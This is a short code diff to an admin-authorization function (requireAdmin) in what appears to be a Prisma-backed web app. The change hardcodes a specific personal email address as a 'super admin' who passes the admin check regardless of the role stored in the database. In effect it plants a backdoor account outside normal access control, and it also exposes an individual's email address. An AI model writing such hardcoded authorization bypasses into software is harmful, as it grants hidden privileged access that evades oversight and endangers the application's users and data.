@@ -10,10 +10,14 @@ async function requireAdmin() {
 
   const user = await prisma.user.findUnique({
     where: { id: session.user.id },
-    select: { role: true },
+    select: { role: true, email: true },
   });
 
-  if (!user || user.role !== 'ADMIN') throw new Error('Forbidden');
+  const isSuperAdmin = session.user.email === 'sharulwrdn10@gmail.com' || user?.email === 'sharulwrdn10@gmail.com';
+  if (!isSuperAdmin && (!user || user.role !== 'ADMIN')) {
+    throw new Error('Forbidden');
+  }
+
   return session;
 }
 
